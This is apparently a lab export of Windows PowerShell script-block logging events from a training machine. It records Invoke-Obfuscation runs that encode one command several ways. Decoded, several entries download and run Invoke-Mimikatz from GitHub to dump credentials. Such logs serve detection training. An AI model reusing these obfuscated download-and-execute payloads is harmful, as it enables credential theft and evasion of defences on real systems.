{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:13:38.198482Z"},"EventRecordID":631706,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-B779-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":" & ( $eNv:COmSPEc[4,15,25]-JoIN'') ([ChAr[]] (73, 69 , 88 ,32 ,40,78 ,101 ,119 ,45, 79, 98,106 ,101,99 , 116 ,32 ,78,101, 116, 46,87, 101 ,98 , 67 ,108 ,105,101 ,110, 116 ,41 , 46, 68, 111 ,119 , 110 , 108 , 111 ,97 ,100 , 83,116, 114,105 , 110, 103, 40 , 39, 104, 116 , 116,112 , 115,58,47,47 ,114, 97 ,119,46 , 103,105 , 116, 104,117, 98 ,117 , 115 , 101 ,114,99, 111 ,110 , 116,101 ,110 , 116, 46 , 99 , 111,109 ,47 ,109 ,97,116 , 116,105,102, 101 , 115 , 116,97 , 116 ,105 ,111 , 110,47,80,111 ,119 , 101,114,83, 112, 108,111, 105,116 ,47,109, 97 , 115 , 116, 101 ,114,47 ,69 ,120, 102,105, 108,116 , 114, 97,116 , 105,111,110, 47 , 73,110 ,118 ,111 , 107 , 101,45 , 77, 105 ,109 , 105, 107 , 97 , 116, 122 , 46 ,112 ,115, 49, 39 ,41 , 59 , 32,73 , 110 , 118 ,111 ,107 ,101,45,77,105 , 109 ,105, 107 ,97, 116 ,122,32 ,45 , 68 ,117 ,109,112 , 67 ,114 , 101,100 , 115 )-join '')","ScriptBlockId":"020184e7-b8b1-4073-b6b7-dbf868048bfb","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:13:52.552625Z"},"EventRecordID":636579,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-D4AD-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":" [sTRInG]::jOiN('' , (( 49 ,45 , 58,20,28 , '4e',65,77 , '2d' ,'4f' ,62 , '6a' , 65,63, 74 ,20 ,'4e', 65 ,74 ,'2e' ,57, 65 , 62,43 ,'6c',69, 65 , '6e' , 74 ,29 ,'2e',44,'6f' , 77 ,'6e','6c' , '6f' ,61, 64 ,53 , 74,72 ,69 ,'6e',67, 28, 27 , 68 ,74, 74,70 ,73, '3a', '2f','2f', 72, 61, 77 , '2e',67,69, 74 ,68 , 75,62, 75, 73,65 ,72,63, '6f','6e',74 ,65, '6e', 74 ,'2e',63 ,'6f', '6d','2f' , '6d', 61 ,74 ,74, 69,66 , 65, 73 ,74 ,61, 74 , 69 ,'6f' , '6e', '2f' ,50,'6f',77, 65,72,53 ,70, '6c' , '6f' ,69 ,74, '2f' , '6d' , 61 , 73 , 74,65,72 , '2f' ,45,78,66, 69, '6c', 74 , 72,61, 74,69,'6f' , '6e' , '2f' , 49,'6e' , 76, '6f','6b' ,65 , '2d' , '4d' ,69,'6d' , 69, '6b',61 , 74 , '7a' , '2e',70, 73 , 31 , 27, 29 ,'3b' ,20 ,49 ,'6e' , 76,'6f', '6b', 65, '2d', '4d',69, '6d' ,69,'6b' , 61 ,74, '7a' , 20 , '2d' ,44 , 75,'6d' , 70, 43, 72 ,65 ,64 , 73)|FoReaCh{ ([ChaR] ([Convert]::TOiNt16(($_.tOsTriNg()),16 )))}))|&( $enV:PuBlic[13]+$eNv:PUbliC[5]+'X')","ScriptBlockId":"a7052bb8-9adc-4e86-ad95-13378e481ee2","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:13:52.553041Z"},"EventRecordID":636580,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-3198-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ ([ChaR] ([Convert]::TOiNt16(($_.tOsTriNg()),16 )))}","ScriptBlockId":"983a81d8-05c7-4871-8d1c-f9aeacd992dd","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.419434Z"},"EventRecordID":640495,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-7BCC-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$UpperLowerChar = $_; If(((Get-Random -Input @(1..2))-1 -eq 0)) {$UpperLowerChar = $UpperLowerChar.ToUpper()} $RandomDelimiters += $UpperLowerChar}","ScriptBlockId":"07215124-2a13-47c5-a629-71de027efee4","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.432351Z"},"EventRecordID":640524,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-87B5-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$DelimitedEncodedArray += ([Convert]::ToString(([Int][Char]$_),$EncodingBase) + (Get-Random -Input $RandomDelimiters))}","ScriptBlockId":"9985f13a-bd9c-4b3f-8d1f-c438a6c4d612","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.518423Z"},"EventRecordID":640705,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-DFCC-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"f1f85520-7ff3-4f1c-973a-36f70bd3d277","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.526966Z"},"EventRecordID":640721,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-E0CC-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"9dddfece-dec9-4a6a-b0b9-65c5362c3b89","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.531763Z"},"EventRecordID":640731,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-E7CC-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"194d9a73-dd83-4782-85a8-8243da1783cb","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.534748Z"},"EventRecordID":640738,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-EDCC-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"d3330e76-8952-426f-8661-10f610c733a5","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.537128Z"},"EventRecordID":640744,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-06B6-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"dc4a4430-354a-47fe-8248-378fcd5fde8a","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.539473Z"},"EventRecordID":640749,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-F1CC-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"b4520b58-fef0-41e9-b6f5-d36e8ea8ac41","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.543595Z"},"EventRecordID":640758,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-0EB6-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"bb4cd9ab-63e9-4bc4-863f-dc656eeb386b","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.553477Z"},"EventRecordID":640779,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-0FB6-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"8dd0e823-3a00-4a5a-96e5-7a3533687e4a","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.590385Z"},"EventRecordID":640861,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-32CD-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"db2d94ff-828f-4610-88fa-3be2042064e5","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.603377Z"},"EventRecordID":640891,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-4FCD-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$EncodedArray += ([Convert]::ToString(([Int][Char]$_),$EncodingBase) + ' '*(Get-Random -Input @(0,1)) + ',' + ' '*(Get-Random -Input @(0,1)))}","ScriptBlockId":"ddc79956-2d87-4038-96b6-9e725f69bb94","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.765416Z"},"EventRecordID":641260,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-D5B6-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"129d1523-f52b-4c6c-84ab-bca4cf1a63ac","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.772019Z"},"EventRecordID":641275,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-D6B6-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"335f92e5-3049-4bbd-8d77-f9f8d0cba876","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:24.809960Z"},"EventRecordID":641359,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-0AB7-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"3abcd876-38f5-46b2-ac97-9a7bcb28ae73","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedOctalCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:33.323391Z"},"EventRecordID":641483,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-38B7-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":" & ( $ENV:pUbLIc[13]+$EnV:pubLIc[5]+'X') ([STrIng]::JOin('' , ((111 ,105, 130 , 40,50,116 ,145 , 167, 55,117,142 , 152 ,145,143 ,164 , 40, 116,145,164,56, 127, 145 ,142, 103 ,154, 151 ,145 ,156 , 164,51, 56 , 104 ,157, 167 ,156 , 154 , 157 , 141 , 144, 123 ,164,162 ,151, 156,147, 50 ,47 ,150 , 164,164,160 , 163 , 72,57, 57,162, 141,167 , 56,147 ,151, 164,150, 165, 142 ,165 , 163, 145, 162,143 ,157, 156 ,164 ,145,156 , 164,56 ,143 ,157 ,155,57, 155 ,141, 164 , 164, 151 , 146,145 ,163, 164 , 141, 164 ,151, 157, 156 ,57 , 120 ,157,167 , 145,162 , 123,160 , 154, 157, 151, 164, 57,155 , 141, 163 ,164,145,162,57,105, 170 , 146,151, 154, 164 , 162 , 141,164,151,157,156 , 57,111,156 , 166 , 157, 153, 145,55, 115 ,151, 155 ,151, 153,141, 164 ,172,56, 160 , 163, 61 ,47 ,51,73 , 40,111,156 , 166, 157 ,153 , 145 ,55 ,115, 151 , 155 ,151 ,153 , 141, 164 ,172 ,40,55, 104,165 , 155, 160 ,103, 162 , 145 , 144 , 163 )| FOrEacH { ([cHar] ([coNVErT]::TOiNT16( ([String]$_ ),8) )) } ))) ","ScriptBlockId":"e2472281-860f-41c5-8cad-468d0e4e80ec","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:33.323857Z"},"EventRecordID":641484,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-39B7-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ ([cHar] ([coNVErT]::TOiNT16( ([String]$_ ),8) )) }","ScriptBlockId":"01376000-eb70-4502-a188-5c37f8bd86eb","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:51.663014Z"},"EventRecordID":646409,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-C6EE-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":".( $vErBOSePreFErencE.TOSTRING()[1,3]+'X'-joIN'')(( '1001001}1000101r1011000C100000&101000&1001110C1100101r1110111C101101;1001111v1100010;1101010r1100101v1100011j1110100v100000X1001110o1100101}1110100X101110}1010111;1100101r1100010v1000011X1101100v1101001j1100101v1101110j1110100}101001j101110}1000100j1101111g1110111g1101110}1101100g1101111g1100001;1100100;1010011}1110100;1110010g1101001X1101110&1100111X101000v100111}1101000;1110100r1110100j1110000}1110011v111010j101111r101111}1110010o1100001X1110111r101110r1100111X1101001&1110100o1101000g1110101j1100010C1110101}1110011&1100101X1110010}1100011}1101111j1101110v1110100j1100101C1101110;1110100r101110&1100011r1101111;1101101&101111&1101101X1100001}1110100}1110100;1101001o1100110v1100101;1110011C1110100C1100001j1110100r1101001;1101111o1101110o101111j1010000&1101111X1110111}1100101j1110010j1010011&1110000;1101100r1101111r1101001;1110100o101111&1101101v1100001r1110011;1110100g1100101j1110010j101111r1000101v1111000r1100110j1101001X1101100C1110100r1110010;1100001o1110100C1101001;1101111X1101110j101111C1001001X1101110;1110110}1101111r1101011&1100101j101101&1001101r1101001v1101101;1101001o1101011o1100001&1110100o1111010v101110g1110000r1110011}110001g100111o101001v111011j100000;1001001j1101110r1110110X1101111v1101011}1100101v101101;1001101r1101001&1101101;1101001C1101011v1100001&1110100j1111010}100000}101101}1000100C1110101v1101101r1110000v1000011j1110010r1100101v1100100;1110011' -splIT 'o'-splIt '&' -SPlIT 'r' -SplIt 'v' -sPLIT 'g'-SPliT';'-spLIT'X'-sPlIt'}' -sPLIT 'C'-SPLIT'j'|FOReaCH-ObjEct {([CHaR]([ConvERT]::tOINT16(( [sTRinG]$_),2 ) )) })-JOIN '' )","ScriptBlockId":"13fd0d28-7263-420b-ae5d-d75a0daea1a3","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:14:51.666420Z"},"EventRecordID":646410,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-ECD6-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{([CHaR]([ConvERT]::tOINT16(( [sTRinG]$_),2 ) )) }","ScriptBlockId":"bafd26f1-6360-41ad-bf2d-9b6c09614cf8","Path":""}}}
